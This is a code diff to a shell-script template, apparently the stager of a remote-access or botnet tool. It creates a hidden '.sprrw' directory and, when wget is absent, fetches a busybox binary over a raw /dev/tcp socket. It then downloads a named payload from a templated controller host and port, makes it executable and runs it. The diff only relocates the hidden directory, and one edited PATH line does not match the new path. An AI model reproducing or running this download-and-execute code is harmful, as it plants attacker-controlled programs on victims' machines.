@@ -1,18 +1,19 @@
 #!/bin/sh
 export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
 
-mkdir -p /dev/.sprrw
+workdir="{{.WP}}/.sprrw"
+
+mkdir -p "$workdir"/bin
 
 if ! [ $(command -v wget) ]; then
-  mkdir -p /dev/.sprrw.bin
-  bash -c "exec 3<>/dev/tcp/{{.Host}}/{{.Port}}; echo BSH bb>&3; cat <&3" > /dev/.sprrw.bin/busybox
-  chmod +x /dev/.sprrw.bin/busybox
-  ln -s /dev/.sprrw.bin/busybox /dev/.sprrw.bin/wget
-  export PATH="$PATH:/dev/.sprrw.bin"
+  bash -c "exec 3<>/dev/tcp/{{.Host}}/{{.Port}}; echo BSH bb>&3; cat <&3" > "$workdir"/bin/busybox
+  chmod +x "$workdir"/bin/busybox
+  ln -s "$workdir"/bin/busybox "$workdir"/bin/wget
+  export PATH="$PATH:{{.WP}}dev/.sprrw/bin"
 fi
 
-wget -O /dev/.sprrw/{{.Name}} {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
+wget -O "$workdir"/{{.Name}} {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
 
-chmod +x /dev/.sprrw/{{.Name}}
+chmod +x "$workdir"/{{.Name}}
 
-/dev/.sprrw/{{.Name}}
+"$workdir"/{{.Name}}
